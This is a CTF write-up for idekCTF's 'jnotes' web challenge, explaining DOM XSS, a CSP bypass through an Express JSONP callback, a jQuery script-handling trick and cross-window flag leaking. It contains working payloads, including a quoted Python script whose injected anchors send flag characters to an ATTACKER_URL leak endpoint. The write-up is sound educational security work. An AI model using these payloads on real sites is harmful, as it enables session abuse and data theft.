</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">language</i><span class="mr-4 text-black font-semibold">web</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">3 solves</span><span class="opacity-60">487 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by downgrade</span></div></div><div class="w-full flex border border-almost-black-lighter rounded-2.5xl mt-7 mb-9 max-sm:flex-col"><div class="flex-1 flex flex-col gap-y-2 px-6 pt-4 pb-5"><span>Attachments</span><!--[--><a href="https://idekctf-challenges.storage.googleapis.com/uploads/eb5c88f7470ffebb70bf4f5dc043ddb026fc3c4ded003c80cfa5bd85f7823b06/jnotes.tar.gz" class="underline">jnotes.tar.gz</a><!--]--></div><button class="pl-9 pr-10 font-semibold flex items-center border-l border-almost-black-lighter rounded-tr-2.5xl rounded-br-2.5xl transition-colors hover:bg-almost-black active:bg-almost-black-lighter max-sm:border-l-0 max-sm:border-t max-sm:pl-6 max-sm:py-4 max-sm:rounded-tr-none max-sm:rounded-bl-2.5xl"><i class="material-symbols-outlined text-2xl mr-4">download</i> Download all </button></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p>Disclaimer: I did not solve this challenge during the ctf. However, I was close to the unintended solution, which shall be the focus of this writeup.</p>
<h1 id="overview" tabindex="-1">Overview</h1>
<p>This is a small XSS challenge with the typical create/report note features. The main crux is working around the restrictive CSP by using a JSONP endpoint.</p>
<p>There is no server-side validation, just straightforward DOM-based XSS in <code>noteContent</code>:</p>
<pre class="named-fence-block"><code class="language-html">&lt;html&gt;

&lt;head&gt;
	&lt;meta http-equiv="Content-Security-Policy"
		content="default-src 'none'; script-src 'self' https://code.jquery.com/jquery-3.7.1.js; connect-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;"&gt;
	&lt;link rel="stylesheet" href="/style.css"&gt;
	&lt;script src="https://code.jquery.com/jquery-3.7.1.js"
		integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"&gt;
	&lt;/script&gt;
	&lt;script src="/view.js"&gt;&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
	&lt;script defer src="/api/view/&lt;%= note %&gt;?callback=showNote"&gt;&lt;/script&gt;
	&lt;div id="noteElement"&gt;
		&lt;h1 id="noteTitle"&gt;&lt;/h1&gt;
		&lt;p id="noteContent"&gt;&lt;/p&gt;
	&lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code><div class="named-fence-filename">notes.ejs</div></pre>
<pre class="named-fence-block"><code class="language-javascript">app.get("/api/view/:note", (req, res) =&gt; {
	return res.jsonp(notes.get(req.params.note));
});
</code><div class="named-fence-filename">server.js</div></pre>
<p>JSONP basically accepts a query parameter named <code>callback</code> which is used to wrap the JSON data in a function call. For example, <code>/api/view/&lt;%= note %&gt;?callback=showNote</code> returns the javascript code: <code>showNote({"noteTitle":"...","noteContent":"..."})</code>. <code>showNote</code> is defined as follows:</p>
<pre class="named-fence-block"><code class="language-javascript">function showNote(note) {
	titleElement = $("#noteTitle");
	contentElement = $("#noteContent");
	titleElement.text(note["noteTitle"]);
	contentElement.html(note["noteContent"]);
};
</code><div class="named-fence-filename">view.js</div></pre>
<p>Additionally, it is worth noting that the bot doesn't do any checks on the provided <code>TARGET_URL</code>, so we have the option to direct it to a site we control.</p>
<pre class="named-fence-block"><code class="language-javascript">let page = await ctx.newPage();
await page.goto(CHALLENGE_ORIGIN, { timeout: 3_000 });
await page.setCookie({ name: 'secret', value: secret, httpOnly: true });
await page.goto(TARGET_URL, { timeout: 10_000, waitUntil: 'domcontentloaded' });
await sleep(15_000);
</code><div class="named-fence-filename">bot.js</div></pre>
<h1 id="%22bypassing%22-jquery's-html()" tabindex="-1">"Bypassing" jQuery's html()</h1>
<p>My first thought was that the JSONP endpoint allows us to do arbitrary function calls by using more script tags, with the caveat that those calls must have a note object as the sole argument. (Fortunately, javascript is extremely lenient and doesn't check that the number of arguments matches.) Not being able to control arguments is already quite restrictive, but when I tested it out with the payload <code>&lt;script src="/api/view/{note_id}?callback=alert" /&gt;</code>, I was surprised to learn that even this didn't work.</p>
<p><img src="/ctf-writeups/idek25/jnotes-error.png" alt=""></p>
<p>Looking at the stack trace we can see that it's because note contents are rendered with jquery's html function, which for some reason does its own wrangling of the html instead of using innerHTML. We find the cause of the error in DOMEval:</p>
<pre class="named-fence-block"><code class="language-javascript">	function DOMEval( code, node, doc ) {
		doc = doc || document;

		var i, val,
			script = doc.createElement( "script" );

		script.text = code;
...
		doc.head.appendChild( script ).parentNode.removeChild( script );
	}
</code><div class="named-fence-filename">jquery-3.7.1.js</div></pre>
<p>For whatever reason, jquery fetches the code and embeds it in an inline script tag instead, causing an error due to CSP disallowing <code>'unsafe-inline'</code>.</p>
<p>I found a way to bypass this later on: Digging into jquery's html function, I found this section of code (also in the above stack trace)</p>
<pre class="named-fence-block"><code class="language-javascript">function domManip( collection, args, callback, ignored ) {

...

			if ( hasScripts ) {
				doc = scripts[ scripts.length - 1 ].ownerDocument;

				// Re-enable scripts
				jQuery.map( scripts, restoreScript );

				// Evaluate executable scripts on first document insertion
				for ( i = 0; i &lt; hasScripts; i++ ) {
					node = scripts[ i ];
					if ( rscriptType.test( node.type || "" ) &amp;&amp;
						!dataPriv.access( node, "globalEval" ) &amp;&amp;
						jQuery.contains( doc, node ) ) {

						if ( node.src &amp;&amp; ( node.type || "" ).toLowerCase()  !== "module" ) {

							// Optional AJAX dependency, but won't run scripts if not present
							if ( jQuery._evalUrl &amp;&amp; !node.noModule ) {
								jQuery._evalUrl( node.src, {  // &lt;-- STACK TRACE FOLLOWS HERE
									nonce: node.nonce || node.getAttribute( "nonce" )
								}, doc );
							}
						} else {

							// Unwrap a CDATA section containing script contents. This shouldn't be
							// needed as in XML documents they're already not visible when
							// inspecting element contents and in HTML documents they have no
							// meaning but we're preserving that logic for backwards compatibility.
							// This will be removed completely in 4.0. See gh-4904.
							DOMEval( node.textContent.replace( rcleanScript, "" ), node, doc );
						}
					}
				}
			}

...
}
</code><div class="named-fence-filename">jquery-3.7.1.js</div></pre>
<p>Right before <code>_evalUrl</code>, where the stack trace continues, there is a check that <code>node.type !== "module"</code>. By adding <code>type="module"</code> to the script tag, I was able to bypass the shenanigans and run it.</p>
<blockquote>
<p><strong>Note</strong></p>
<p>I should have dug deeper into what <code>_evalUrl</code> was doing, as it was apparently part of the intended solution.</p>
</blockquote>
<h1 id="exfiltration" tabindex="-1">Exfiltration</h1>
<p>One thing I noticed early on was that the secret cookie was <code>HttpOnly</code>, making it almost impossible to leak. Fortunately, we can fetch the flag from <code>/api/flag</code> and find a way to leak that.</p>
<p>The main difficulty is that CSP prevents us from making cross-origin requests to leak the flag. I thought of using functions like <code>location.replace</code>, but without control over the arguments it was useless. However, recall that the bot can visit any arbitrary url. For example, if we host a website with the jnotes site in an iframe, it opens up new ways to leak information, such as <code>window.top.postMessage</code> (more on this later).</p>
<p>Clearly, our function calls using the JSON endpoint are our main asset. To maximize its use, I looked into what characters are allowed in the callback parameter, which can be seen in the express source code:</p>
<pre class="named-fence-block"><code class="language-javascript">res.jsonp = function jsonp(obj) {
...

  if (typeof callback === 'string' &amp;&amp; callback.length !== 0) {
    this.set('X-Content-Type-Options', 'nosniff');
    this.set('Content-Type', 'text/javascript');

    // restrict callback charset
    callback = callback.replace(/[^\[\]\w$.]/g, ''); // &lt;-- HERE!

    if (body === undefined) {
      // empty argument
      body = ''
    } else if (typeof body === 'string') {
      // replace chars not allowed in JavaScript that are in JSON
      body = body
        .replace(/\u2028/g, '\\u2028')
        .replace(/\u2029/g, '\\u2029')
    }

    // the /**/ is a specific security mitigation for "Rosetta Flash JSONP abuse"
    // the typeof check is just to reduce client error noise
    body = '/**/ typeof ' + callback + ' === \'function\' &amp;&amp; ' + callback + '(' + body + ');';
  }

  return this.send(body);
};
</code><div class="named-fence-filename">express/lib/response.js</div></pre>
<p>So we have <code>a-z</code>, <code>A-Z</code>, <code>0-9</code>, <code>_</code>, <code>$</code>, <code>[</code>, <code>]</code>, and <code>.</code>. This allows us to drill down to pretty much any object property desired. 2 main targets stood out to me: jquery functions and the window object.</p>
<p>I mentally ruled out jquery early on (a mistake, as it turned out to be the intended solution!) and instead focused on using the window object to access DOM elements (if there is a single element with id <code>A</code> in the DOM, it can be referenced in javascript with <code>window.A</code>). After spending some time in the think tank, I came up with the following idea for binary exfiltration:</p>
<ol>
<li>Host a site with the jnotes site in an iframe.</li>
<li>In jnotes, create the script tag <code>&lt;script id="flag" src="/api/flag"&gt;&lt;/script&gt;</code></li>
<li>Create a div <code>&lt;div id="a"&gt;&lt;/div&gt;</code> (the id is the guessed character)</li>
<li><code>window.flag.textContent[9]</code> returns the first character in the flag (due to the prefix <code>{"flag":"</code>)</li>
<li>Thus, <code>window[window.flag.textContent[9]]</code> returns either the div element if the first character is <code>a</code>, or <code>undefined</code> if it is not.</li>
<li>We can go from the div element to the window object, and then <code>postMessage</code> to our top-level site using <code>window[window.flag.textContent[9]].ownerDocument.defaultView.top.postMessage</code>. Create a script tag with src as our JSONP endpoint and use that as the callback.</li>
<li>So the final <code>noteContent</code> payload is (with <code>type="module"</code> to get past jquery):<pre><code class="language-html">&lt;script type="module" id="flag" src="/api/flag"&gt;&lt;/script&gt;
&lt;div id="a"&gt;&lt;/div&gt;
&lt;script type="module" src="/api/view/{note_id}?callback=window[window.flag.textContent[9]].ownerDocument.defaultView.top.postMessage"&gt;&lt;/script&gt;
</code></pre>
</li>
<li>If our site gets a message, we know the first character is <code>a</code>, otherwise we try the next character, thereby leaking the flag through binary exfiltration.</li>
</ol>
<p>There were a few issues with this plan. Firstly, the script tag would not load <code>/api/flag</code> because its <code>Content-Type</code> was json. More importantly, we can't access the source of an external script tag, and as far as I'm aware there is no element that fetches a resource and makes it accessible from javascript.</p>
<p>Secondly, <code>postMessage</code> requires a second argument: the target origin. We needed something like <code>postMessage(_, "http://attacker.com")</code> or it would be blocked by CORS. Our JSONP primitive doesn't let us control the arguments, so <code>postMessage</code> fails.</p>
<p>I was able to solve the second issue using the <code>window.closed</code> property. Instead of an iframe, I opened the jnotes site with <code>window.open</code>, and replaced <code>defaultView.top.postMessage</code> in the JSONP callback with <code>defaultView.close</code>. From the attacker-controlled site, I then checked <code>window.closed</code> to see if the character was correct. I tested this with the following PoC:</p>
<pre class="named-fence-block"><code class="language-html">&lt;script&gt;
  const w = window.open('http://localhost:8000/')
  setTimeout(() =&gt; console.log(w.closed), 100)
&lt;/script&gt;
</code><div class="named-fence-filename">t.html</div></pre>
<pre class="named-fence-block"><code class="language-python">from flask import Flask

app = Flask(__name__)

@app.get('/')
def index():
    return '''&lt;script&gt;
  window.close({'a': 'aoeu'});
&lt;/script&gt;'''

app.run(port=8000)
</code><div class="named-fence-filename">t_server.py</div></pre>
<p>Opening <code>file://.../t.html</code> in the browser, I verified that it was possible to leak data using <code>window.closed</code>. The first problem, however, proved to be more difficult.</p>
<p>My teammate, @kek, suggested using an iframe in the parent window, which can be accessed from jnotes with <code>window.opener.frames[0].document.body.textContent</code> since they are same-origin. However, we later found out that the iframe isn't able to load the flag since the <code>secret</code> cookie isn't sent due to <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">SameSite restrictions</a>. Although it isn't explicitly set on the <code>secret</code> cookie, the default value for <code>SameSite</code> on chrome, which puppeteer uses, is <code>Lax</code>. <code>Lax</code> cookies are only sent when the two conditions are met:</p>
<ul>
<li>The request uses the GET method.</li>
<li>The request resulted from a top-level navigation by the user, such as clicking on a link.</li>
</ul>
<p>The second restriction makes it impossible for the cookie to ever be sent from an iframe. So <code>/api/flag</code> must be on a top-level window. I tried using <code>window.open('/api/flag')</code> from the attacker site, but couldn't find a way to access it from jnotes using only property names.</p>
<p>Unfortunately, we got stuck here and the CTF ended 40 minutes later.</p>
<h1 id="what-we-were-missing" tabindex="-1">What we were missing</h1>
<p>After the CTF, we looked at <a href="https://discord.com/channels/912045579541041192/1401128395223334922/1401868459750592553">@realansgar's solution</a> which had a similar approach. Here's the missing piece:</p>
<pre><code class="language-javascript">&lt;script&gt;
    window.open('https://jnotes-web.chal.idek.team/note/{noteid}', '_blank');
    location = 'https://jnotes-web.chal.idek.team/api/flag';
&lt;/script&gt;
</code></pre>
<p>Navigating to <code>/api/flag</code> on the <em>original window</em> after opening the jnotes site meant we could access the window handle with <code>window.opener</code>.</p>
<p>Additionally, instead of using <code>window.close</code> to leak characters (which no longer works since our site has been replaced with <code>/api/flag</code>), @realansgar used the <code>click()</code> method on anchor tags, which is much simpler and faster:</p>
<pre><code class="language-python">def gen_anchors():
    for char in range(ord("!"), ord("z")):
        yield f"""&lt;a id="&amp;#{char};" href="{ATTACKER_URL}/leak?char=&amp;#{char};" target="top"&gt;Click me&lt;/a&gt;"""

...

@app.route("/attack")
def attack():
    res = requests.post(
        "https://jnotes-web.chal.idek.team/api/post",
        json={
            "noteTitle": "a",
            "noteContent": f"""
                &lt;iframe srcdoc='
                    {"\n".join(gen_anchors())}
                    &lt;script src="/api/view/f82fdf2d9cdbd5f0688289313260b3d5?callback=window[top.opener.document.body.children[0].textContent[{len(FLAG)}]].click"&gt;&lt;/script&gt;
                ' /&gt; 
    """,
        },
    )
</code></pre>
<h1 id="closing-thoughts" tabindex="-1">Closing thoughts</h1>
<p>I personally like this kind of puzzle-like challenge with very minimal source code and a small search space, where the crux lies in creative use of the tools at hand. Although I didn't solve this challenge, I still enjoyed it, and learned a few things.</p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><div class="relative h-full flex"><div class="dotted-line-vert h-auto mb-10 mr-5"></div><!----><div class="flex-1 flex flex-col pt-16"><span class="mt-6 mb-4 ml-4 opacity-60">Sections</span><!--[--><!--]--></div></div></div></div><!----></div></div>
    
  

</body></html>